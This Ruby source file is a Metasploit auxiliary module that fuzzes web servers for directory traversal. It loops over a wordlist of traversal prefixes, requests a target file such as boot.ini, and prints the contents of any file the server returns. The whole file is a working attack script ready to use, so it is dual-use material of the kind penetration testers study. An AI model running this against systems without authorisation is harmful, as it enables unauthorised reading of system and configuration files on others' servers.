##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Auxiliary
	
	# Exploit mixins should be called first
	include Msf::Exploit::Remote::HttpClient
	# Scanner mixin should be near last
	include Msf::Auxiliary::Report

	def initialize
		super(
			'Name'        => 'Directory Transversal Fuzzer',
			'Version'     => '$Revision:  $',
			'Description' => 'This modules is a directory traversal fuzzer',

			'Author'      => 'CG' ,
			'License'     => MSF_LICENSE,
			'References'	=>
				[
					[ 'URL', 'http://www.owasp.org/index.php/Fuzzing' ],
				]	
		)		
		register_options(
			[
				OptString.new('PATH', [ true,  "URI Path", '/']),				
				OptString.new('FILE', [ true,  "The file to view", 'boot.ini']),
				OptString.new('FUZZFILE', [ false, 'The file that contains a list of fuzz strings.', File.join(Msf::Config.install_root, 'data', 'wordlists', 'dir_traversal_strings.txt')]),
			], self.class)
	end

	def run

		begin	
			file = datastore['FILE']
			path = datastore['PATH']

			File.open(datastore['FUZZFILE']).each_line do |fuzztrav| 

			string = fuzztrav.strip+datastore['FILE']

			res = send_request_raw({
				'uri'          => path+string, 
				'method'       => 'GET'
						}, 10)

			if (res and res.code == 200)
				print_status("#{string}")
				print_status("Output Of Requested File:\n#{res.body}")
			else
				print_error("Received #{res.code} for #{string}")
			end
		end
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
		end
	end
	
end
